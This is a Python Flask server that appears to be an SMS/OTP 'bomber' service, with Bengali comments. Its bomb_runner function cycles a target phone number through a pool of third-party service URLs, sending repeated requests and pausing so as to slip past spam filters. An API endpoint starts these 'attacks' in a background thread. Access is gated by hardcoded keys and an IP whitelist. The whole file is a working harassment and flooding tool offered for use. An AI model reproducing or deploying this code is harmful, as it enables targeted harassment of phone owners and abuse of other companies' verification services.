import json, requests, time, os, threading
from flask import Flask, request, jsonify, render_template
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

# --- Configuration ---
ADMIN_CONFIG = {
    "master_key": "Prime_xyron_9xm",
    "admin_pass": "PRIME_XYRON_LOG",
    "whitelist_file": "whitelist.json",
    "requests_file": "requests.json"
}

# --- Database Helpers ---
def load_db(file):
    if not os.path.exists(file):
        with open(file, 'w') as f: json.dump([], f)
        return []
    try:
        with open(file, 'r') as f: return json.load(f)
    except: return []

def save_db(file, data):
    with open(file, 'w') as f: json.dump(data, f)

# --- Real-Time Execution Engine ---
def bomb_runner(target, count):
    """এটি ব্যাকগ্রাউন্ডে apis.json থেকে রিকোয়েস্ট পাঠাবে"""
    try:
        with open('apis.json', 'r') as f:
            api_pool = json.load(f).get('services', [])
    except Exception as e:
        print(f"Error loading apis.json: {e}")
        return

    if not api_pool:
        print("No APIs found in apis.json")
        return

    sent = 0
    # লুপ চালিয়ে রিকোয়েস্ট পাঠানো
    for i in range(count):
        service = api_pool[i % len(api_pool)]
        url = service['url'].replace("{phone}", target)
        method = service.get('method', 'GET')
        headers = service.get('headers', {})
        payload = service.get('data', {})

        try:
            # {phone} ট্যাগ রিপ্লেস করা (যদি পেলোড থাকে)
            if payload:
                payload_str = json.dumps(payload).replace("{phone}", target)
                payload = json.loads(payload_str)

            if method == "POST":
                requests.post(url, json=payload, headers=headers, timeout=5)
            else:
                requests.get(url, headers=headers, timeout=5)
            
            sent += 1
            # স্প্যাম ফিল্টার এড়াতে ছোট গ্যাপ (০.২ সেকেন্ড)
            time.sleep(0.2)
        except:
            continue
    
    print(f"Attack Finished. Target: {target}, Total Sent: {sent}")

# --- Routes ---

@app.route('/')
def home():
    return {"status": "running", "owner": "Prime Xyron", "v": "1.0.0"}

@app.route('/admin')
def admin_page():
    return render_template('admin.html')

@app.route('/api/v1/status')
def get_status():
    return jsonify({
        "pending": load_db(ADMIN_CONFIG["requests_file"]),
        "approved": load_db(ADMIN_CONFIG["whitelist_file"])
    })

@app.route('/api/v1/execute', methods=['GET'])
def execute():
    client_ip = request.headers.get('x-forwarded-for', request.remote_addr).split(',')[0]
    user_key = request.args.get('key')
    
    whitelist = load_db(ADMIN_CONFIG["whitelist_file"])
    
    if user_key != ADMIN_CONFIG["master_key"] or client_ip not in whitelist:
        pending = load_db(ADMIN_CONFIG["requests_file"])
        if not any(r['ip'] == client_ip for r in pending):
            pending.append({
                "ip": client_ip, 
                "ua": request.headers.get('User-Agent', 'Unknown'),
                "time": time.strftime("%H:%M:%S")
            })
            save_db(ADMIN_CONFIG["requests_file"], pending)
        return jsonify({"code": 401, "msg": "APPROVAL_REQUIRED", "ip": client_ip}), 401

    target = request.args.get('target')
    count = request.args.get('count', type=int)

    if not target or not count:
        return jsonify({"code": 400, "msg": "INVALID_PARAMS"}), 400

    # Thread ব্যবহার করা হয়েছে যাতে ব্রাউজার লোডিং ছাড়াই ব্যাকগ্রাউন্ডে কাজ চলে
    task = threading.Thread(target=bomb_runner, args=(target, count))
    task.start()

    return jsonify({
        "code": 200, 
        "status": "ATTACK_STARTED", 
        "target": target, 
        "count": count,
        "msg": "Prime Xyron Engine is processing your request."
    })

@app.route('/api/v1/control', methods=['POST'])
def control():
    data = request.json
    if data.get('auth') != ADMIN_CONFIG["admin_pass"]:
        return jsonify({"msg": "WRONG_PASS"}), 401
    
    action = data.get('action')
    val = data.get('value')
    
    whitelist = load_db(ADMIN_CONFIG["whitelist_file"])
    pending = load_db(ADMIN_CONFIG["requests_file"])

    if action == "approve":
        if val not in whitelist: whitelist.append(val)
        pending = [r for r in pending if r['ip'] != val]
    elif action == "reject" or action == "remove":
        whitelist = [i for i in whitelist if i != val]
        pending = [r for r in pending if r['ip'] != val]
    
    save_db(ADMIN_CONFIG["whitelist_file"], whitelist)
    save_db(ADMIN_CONFIG["requests_file"], pending)
    
    return jsonify({"msg": "UPDATED", "active": whitelist})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
